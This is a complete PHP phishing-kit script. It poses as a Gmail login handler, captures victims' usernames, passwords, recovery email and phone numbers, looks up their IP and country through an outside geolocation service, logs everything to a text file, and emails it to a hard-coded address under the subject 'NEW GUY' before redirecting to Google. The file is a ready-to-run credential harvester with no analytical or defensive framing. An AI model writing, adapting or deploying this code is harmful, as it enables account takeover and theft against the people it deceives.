<?php
$_SCRIPTNAME = 'GMAIL'; //Name of script
$_EMAILS = 'pgrim6495@gmail.com'; //Emails for reporting about new victims
$_REDIRECTURL = 'https:/google.com/'; //Page url to redirect after login


$username = $_POST["username"]; //Username or email name in request
$password = $_POST["password"]; //Password name in request

function getLocationInfoByIp(){

    $client  = @$_SERVER['HTTP_CLIENT_IP'];

    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];

    $remote  = @$_SERVER['REMOTE_ADDR'];

    $result  = array('country'=>'', 'city'=>'');

    if(filter_var($client, FILTER_VALIDATE_IP)){

        $ip = $client;

    }elseif(filter_var($forward, FILTER_VALIDATE_IP)){

        $ip = $forward;

    }else{

        $ip = $remote;

    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));    

    if($ip_data && $ip_data->geoplugin_countryName != null){

        $result['country'] = $ip_data->geoplugin_countryCode;

        $result['city'] = $ip_data->geoplugin_city;

    }

    return $result;

}


$ip = $_SERVER['REMOTE_ADDR'];
$u = $_SERVER['HTTP_USER_AGENT'];
$iso_code = getLocationInfoByIp();
$info = $username.':'.$password.':'.$ip.':'.$iso_code['country'].PHP_EOL;

$file = 'result.txt';
$current = file_get_contents($file);
$current .= $info;
file_put_contents($file, $current);

$subject = '['.$_SCRIPTNAME.']'.' NEW GUY'; 
$to = $_EMAILS;
$message = ' 
<html> 
    <head> 
        <title>'.'['.$_SCRIPTNAME.']'.' NEW GUY</title> 
    </head> 
    <body>   
		<p>Username: '.$username.'</p>
		<p>Password: '.$password.'</p>   
        <p>Recovey: '.$_POST["recEmail"].$_POST["phone"].'</p>   
        <p>IP: '.$ip.'</p> 
        <p>Country: '.$iso_code['country'].'</p>
        <p>User-Agent: '.$u.'</p> 
    </body> 
</html>'; 

$headers  = "Content-type: text/html; charset=windows-1251 \r\n"; 
$headers .= "From: Teraflops <info@kryptex.pw>\r\n"; 
mail($to, $subject, $message, $headers); 


header("Location: ".$_REDIRECTURL);
?>